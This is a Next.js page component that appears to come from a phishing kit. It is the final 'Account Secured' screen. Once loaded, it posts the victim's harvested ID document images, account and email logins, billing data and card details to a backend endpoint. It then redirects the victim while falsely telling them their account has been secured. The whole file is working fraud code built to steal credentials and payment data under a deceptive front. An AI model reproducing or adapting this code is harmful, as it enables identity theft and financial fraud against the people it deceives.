/* eslint-disable @next/next/no-img-element */
import axios from "axios";
import Head from "next/head";
import React, { useContext, useEffect } from "react";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import { DataContext } from "../_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  return (
    <Wrapper>
      <Head>
        <title>Account Secured</title>
      </Head>
      <Container>
        <div className={`login-form`}>
          <h3>Your account has been secured</h3>
          <form>
            <fieldset>
              <legend
                style={{
                  fontSize: `13.5px`,
                }}
              >
                {`Please wait while we redirect you to the login page.`}.
              </legend>
              <div className={`control-group`}>
                <img src={`/images/loader.gif`} alt={`Loader`} />
              </div>
            </fieldset>
          </form>
        </div>
      </Container>
    </Wrapper>
  );
};

export default Confirmation;
